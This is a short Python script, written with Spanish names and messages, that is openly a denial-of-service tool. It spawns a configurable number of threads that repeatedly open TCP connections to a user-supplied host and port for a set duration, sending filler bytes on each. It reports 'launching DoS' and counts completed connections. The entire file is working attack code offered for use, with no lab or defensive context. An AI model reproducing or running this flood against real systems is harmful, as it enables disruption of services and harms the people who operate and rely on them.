import argparse
import socket
import threading
import time


def inundar(destino, puerto, fin, payload, contador_lock, contador):
    while time.time() < fin:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.2)
            s.connect((destino, puerto))
            s.send(payload)
            s.close()
            with contador_lock:
                contador[0] += 1
        except Exception:
            pass


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--destino", required=True)
    parser.add_argument("--puerto", type=int, required=True)
    parser.add_argument("--duracion", type=int, default=20)
    parser.add_argument("--hilos", type=int, default=50)
    args = parser.parse_args()

    print(f"Lanzando DoS hacia {args.destino}:{args.puerto} por {args.duracion}s con {args.hilos} hilos")

    payload = b"A" * 1024
    fin = time.time() + args.duracion
    contador = [0]
    contador_lock = threading.Lock()

    hilos = []
    for _ in range(args.hilos):
        hilo = threading.Thread(target=inundar, args=(args.destino, args.puerto, fin, payload, contador_lock, contador))
        hilo.start()
        hilos.append(hilo)

    for hilo in hilos:
        hilo.join()

    print(f"Ataque finalizado. Conexiones completadas: {contador[0]}")


if __name__ == "__main__":
    main()